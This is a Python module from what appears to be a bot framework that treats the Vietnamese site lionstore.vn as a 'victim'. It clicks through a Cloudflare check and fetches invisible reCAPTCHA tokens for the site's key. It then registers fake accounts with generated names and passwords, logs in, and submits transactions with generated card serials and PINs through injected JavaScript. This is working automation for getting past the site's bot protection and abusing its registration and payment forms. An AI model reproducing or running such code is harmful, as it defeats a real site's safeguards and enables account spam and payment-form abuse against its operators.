import os

from .base import Base


class lionstorevn(Base):
    def __init__(self, proxy: str):
        super().__init__(proxy, 'd')

        with open(f'{os.getcwd()}\\victims\\\js\\\lionstorevn.js', encoding='utf-8') as file:
            self.script = file.read()

    def run(self):
        self.get('https://lionstore.vn/reg.html')
        self.tick_cloudflare_checkbox()

        anchor = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdHnSQfAAAAAIzU16oY8f6qJBKEEVqgNqZGOOxu&co=aHR0cHM6Ly9saW9uc3RvcmUudm46NDQz&hl=en&v=QUpyTKFkX5CIV6EF8TFSWEif&size=invisible&cb=idjmdyfkpxe9'
        captcha_token = self.get_invisible_recaptcha_token(anchor)
        username = self.create_username()
        name = self.create_fullname()
        password = self.create_password()
        result = self.driver.run_js_loaded(
            self.script.replace('<method>', f'return await victim.register(arguments[0], arguments[1], arguments[2], arguments[3])'),
            captcha_token,
            username,
            name,
            password,
            timeout=30
        )
        # print(result)

        self.get('https://lionstore.vn/login.html')
        result = self.driver.run_js_loaded(
            self.script.replace('<method>', f'return await victim.login(arguments[0], arguments[1])'),
            username,
            password,
            timeout=30
        )
        # print(result)

        # self.driver.refresh()
        pin = self.create_pin()
        serial = self.create_serial()
        captcha_token = self.get_invisible_recaptcha_token(anchor)
        result = self.driver.run_js_loaded(
            self.script.replace('<method>', f'return await victim.transaction(arguments[0], arguments[1], arguments[2])'),
            captcha_token,
            serial,
            pin,
            timeout=30
        )
        print(result)